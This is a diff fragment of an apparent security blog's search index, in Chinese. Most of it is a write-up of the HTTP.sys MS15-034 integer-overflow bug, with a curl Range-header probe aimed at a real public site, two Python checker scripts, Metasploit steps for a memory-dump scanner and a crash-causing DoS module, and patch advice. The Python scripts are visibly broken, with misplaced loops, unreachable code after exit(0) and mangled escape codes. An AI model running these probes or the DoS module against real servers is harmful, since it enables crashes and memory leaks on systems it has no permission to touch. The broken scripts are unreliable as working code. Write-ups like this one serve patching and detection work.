-<td align="center">Request.QueryString(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-</tbody></table>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
-<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-      <tags>
-        <tag>低危漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
-    <url>//67bda6fdaf83.html</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
-<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
-<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器打上了补丁，那么响应状态应该是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
-<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>命令执行漏洞</tag>
       </tags>
   </entry>
   <entry>
